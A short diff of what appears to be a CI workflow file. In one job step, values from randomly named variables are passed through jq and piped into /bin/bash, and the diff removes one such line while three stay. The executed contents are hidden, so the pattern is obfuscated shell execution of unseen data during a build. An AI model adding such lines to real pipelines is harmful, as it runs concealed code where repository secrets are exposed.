@@ -22,7 +22,6 @@ jobs:
           echo $j6 | jq -r .g88 | /bin/bash
           echo $ufihb5 | jq -r .oimft280 | /bin/bash
           printf '%s' "$nqdug89" | jq -r .hn65990 | /bin/bash
-          echo $lv22631 | jq -r .zyebj642 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
